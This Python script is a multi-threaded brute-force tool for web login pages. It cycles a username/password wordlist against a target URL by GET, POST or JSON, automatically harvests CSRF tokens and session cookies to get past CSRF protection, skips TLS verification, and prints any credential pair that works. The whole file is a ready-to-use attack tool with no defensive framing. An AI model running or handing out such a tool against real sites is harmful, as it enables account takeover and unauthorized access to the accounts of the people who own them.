import argparse
import requests
import json
from threading import Thread
import time
from bs4 import BeautifulSoup

def listChunks(myList, numOfChunks):
    """ Yield successive n-sized chunks from myList."""
    """ Idea from (stackoverflow) : https://goo.gl/Hvnmx6 """
    for i in range(0, len(myList), numOfChunks):
        yield myList[i:i + numOfChunks]

def BruteForce(url, usernameField, passwordField, postBool, getBool, jsonBool, dictionary, 
                    provided_username, provided_password, check_value, otherArgsList, csrfField,  
                    allowRedirectsBool, correctValue, wrongValue, waitingTime, numThreads):
    
    newDictionary = list(listChunks(dictionary, (len(dictionary) // numThreads)))
    listOfThreads = []
    resultList = []

    # We loop through each sub list 
    for sub_list in newDictionary:  
        # We create a thread for each sublist and append it to the list of threads    
        listOfThreads.append(Thread(target=Requester, args=(url, provided_username,
                    provided_password,  sub_list, postBool, getBool, jsonBool, 
                    allowRedirectsBool, correctValue, wrongValue, waitingTime, 
                    check_value, otherArgsList, csrfField, resultList)))
    
    # Start the threads in the list
    for thread in listOfThreads:
        thread.start()
    
    # Waits for threads to terminate
    for thread in listOfThreads:
        thread.join()
 
    finalResults = ""
    # We check for a value that is diff from False 
    for each_element in resultList:
        if each_element != False:
            finalResults += "The correct username/password combination is : " + each_element[usernameField] + "/" + each_element[passwordField] +"\n"
    return finalResults
            

    return "No correct username/password combination was found"

# A fucntion that obtains the CSRF Token and the Session correspondent with it
def obtain_csrf_token_and_session(login_page_url, tag_name):

    r = requests.get(login_page_url)

    page_content = BeautifulSoup(r.text, 'lxml')

    # We find all the input tags in the page to search for the csrf element
    all_tag_elements = page_content.find_all("input")

    for each_tag in all_tag_elements:
        # After finding the csrf element we get it's value
        if each_tag.get('name') == tag_name:
            csrf_token = each_tag.get('value')
            break
    
    # We also obtain the cookies linked with the csrf generated
    session_cookie = r.cookies.get_dict()

    return csrf_token, session_cookie

def Requester(url, provided_username, provided_password, sub_list, postBool, getBool, 
                        jsonBool, allowRedirectsBool, correctValue, wrongValue, waitingTime,
                        check_value, otherArgsList, csrfField, resultList):
    
    # We loop through each element in the sublist
    for each_element in sub_list:
        # Username given / Password not given
        if check_value == 0:
            data = {usernameField : provided_username , passwordField : each_element}

        # Username not given / Password given
        elif check_value == 1:
            data = {usernameField : each_element, passwordField : provided_password}
        
        # Username / Password given
        elif check_value == 2:
            data = {usernameField : provided_username, passwordField : provided_password}

        # We check if the user added other arguments, so that we can add them to our data
        if otherArgsList != None:
            for each_arg in otherArgsList:
                key = each_arg.split(':')[0]
                value = each_arg.split(':')[1]
                data[key] = value

        session_cookie = {}

        # If the user provided a csrf token tag name, we call the correspondent function
        if csrfField != "":
            csrf_token, session_cookie = obtain_csrf_token_and_session(url, csrfField)
            data[csrfField] = csrf_token

        # Begin request generation
        if postBool:
            headers = {}
            if jsonBool:
                data = json.dumps(data)
                headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}

            requestResult = requests.post(url, data=data, headers=headers, cookies=session_cookie, 
                        allow_redirects=allowRedirectsBool, verify=False)

        elif getBool:
            requestResult = requests.get(url, params=data, cookies=session_cookie, 
                        allow_redirects=allowRedirectsBool, verify=False)

        # Waiting time between requests in seconds, provided by the user (Default = 0)
        time.sleep(waitingTime)

        requestResultText = requestResult.text

        if ((correctValue in requestResultText) and (wrongValue not in requestResultText)):
            resultList.append(data)
        else:
            resultList.append(False)


# A function that reads a text file and generates a list from it's content
def GenerateListFromDict(path_to_dict):
    with open(path_to_dict, "r") as f:
        dictionary = list(map(str.strip, f.readlines()))
    return dictionary


# Main Loop
if __name__ == "__main__":
    
    # Font : Ogre (http://patorjk.com)
    print(r"""
              _ _   _      _____ _                        _          _ 
  /\/\  _   _| | |_(_)    /__   \ |__  _ __ ___  __ _  __| | ___  __| |
 /    \| | | | | __| |_____ / /\/ '_ \| '__/ _ \/ _` |/ _` |/ _ \/ _` |
/ /\/\ \ |_| | | |_| |_____/ /  | | | | | |  __/ (_| | (_| |  __/ (_| |
\/    \/\__,_|_|\__|_|     \/   |_| |_|_|  \___|\__,_|\__,_|\___|\__,_|
                                                                       
   ___            _               ___                                  
  / __\_ __ _   _| |_ ___        / __\__  _ __ ___ ___ _ __            
 /__\// '__| | | | __/ _ \_____ / _\/ _ \| '__/ __/ _ \ '__|           
/ \/  \ |  | |_| | ||  __/_____/ / | (_) | | | (_|  __/ |              
\_____/_|   \__,_|\__\___|     \/   \___/|_|  \___\___|_|              
                                                                       
    """)

    parser = argparse.ArgumentParser(description='Multi-Threaded BruteForce of a login page')

    parser.add_argument('-u', '--url', dest='loginURL', required=True, 
                    help='The URL of the login page you want to BruteForce')

    parser.add_argument('-correct', dest='correctValue', required=True, 
                    help='The Expected correct value when the user/pass is correct')
    
    parser.add_argument('-wrong', dest='wrongValue', required=True, 
                    help='The Expected wrong value when the user/pass is wrong')
 
    parser.add_argument('-userField', '--usernameField', dest='usernameField', required=True, 
                        help='The \'username\' as it is shown in the HTML name field')

    parser.add_argument('-passField', '--passwordField', dest='passwordField', required=True, 
                            help='The \'password\' as it is shown in the HTML name field')

    parser.add_argument('-o', '--other', dest='otherArgs', nargs='*', 
                        help='Other arguments that needs to be passed to request the page seperated by a semicolon \
                        . For example if the arg is "login" and the value is "true" you pass - login:true')

    parser.add_argument('-csrf', dest='csrfField', 
                        help='If the page has a CSRF protection. Provide the name of the csrf field')

    parser.add_argument( '-t', '--threads', dest='numThreads', default=1, type=int, 
                        help='The number of threads to use (Default=1)')

    parser.add_argument('-d', '--dict', dest='dictionary', required=True, 
                        help='Usernames/Passwords dictionary')

    parser.add_argument('-user', '--username', dest='username', 
                        help='A username, if one is known beforehand')

    parser.add_argument('-pass', '--password', dest='password', 
                        help='A password, if one is known beforehand')

    parser.add_argument('-j', '--json', dest='jsonBool', action='store_true', 
                        help='A boolean that specify if the login is sent via JSON')

    parser.add_argument('-g', '--get', dest='getBool', action='store_true', 
                        help='A boolean that specify if the login is sent via GET')
        
    parser.add_argument('-p', '--post', dest='postBool', action='store_true',  
                        help='A boolean that specify if the login is sent via POST')
    
    parser.add_argument('-r', '--redirect', dest='allowRedirectsBool', action='store_false', 
                        help='A boolean that specify if we want to follow the redirects of the page')
    
    parser.add_argument('-w', '--wait', dest='waitingTime', type=int, default=0, 
                        help='The value to wait between requests in seconds')

    parser.add_argument('-v', '--version', dest='scriptVersion', action='version', 
                        version='%(prog)s 0.1', help='Prints the program\'s version')

    # Parse the passed arguments
    args = parser.parse_args()

    # Getting the URL to bruteforce
    url = args.loginURL

    # Getting the username/password fields name (as in the HTML)
    usernameField = args.usernameField
    passwordField = args.passwordField

    # Getting other args if needed
    otherArgsList = args.otherArgs

    # Getting CSRF field name (as in the HTML) if there is a CSRF protection
    csrfField = args.csrfField if args.csrfField != None else ""
   
    # Getting information about HTTP verb method to use 
    postBool = args.postBool
    getBool = args.getBool

    # Getting information if the requests is sent via JSON
    jsonBool = args.jsonBool

    # Allowing redirects boolean, indicating if we follow or not the responses
    allowRedirectsBool = args.allowRedirectsBool

    # Getting the number of threads to use
    numThreads = args.numThreads
    if (numThreads <= 0):
        numThreads = 1

    # Number of seconds to wait between requests
    waitingTime = args.waitingTime

    # Parsing the Correct/Wrong values for the bruteforce
    correctValue = args.correctValue
    wrongValue =  args.wrongValue

    # Checking if the user sent both HTTP verbs
    if postBool == getBool == True:
        print("ERROR : Can't send request in POST and GET at the same time")
        exit()
    
    # Getting the username / password from the user 
    provided_username = args.username if args.username != None else ""
    provided_password = args.password if args.password != None else ""

    # Getting the Password/Username Dict
    dictionary = GenerateListFromDict(args.dictionary)

    # The check value is used to determine if the user gave a username or a password
    if (provided_username != "" and provided_password == "") :
        check_value = 0 # Username given / Password not given
    elif (provided_username == "" and provided_password != "") :
        check_value = 1 # Username not given / Password given
    elif (provided_username != "" and provided_password != "") :
        check_value = 2 # Username given / Password given

    # Constructor Definition
    # BruteForce(url, usernameField, passwordField, postBool, getBool, jsonBool, dictionary, 
    #               provided_username, provided_password, check_value, otherArgsList, csrfField, 
    #               allowRedirectsBool, correctValue, wrongValue, waitingTime, numThreads)

    finalResults = BruteForce(url, usernameField, passwordField, postBool, getBool,
                     jsonBool, dictionary, provided_username, provided_password, 
                    check_value, otherArgsList, csrfField, allowRedirectsBool, correctValue, wrongValue, waitingTime, numThreads)

    # We print the final resulsts (Combination of the correct user/pass) if there is one
    print(finalResults)
    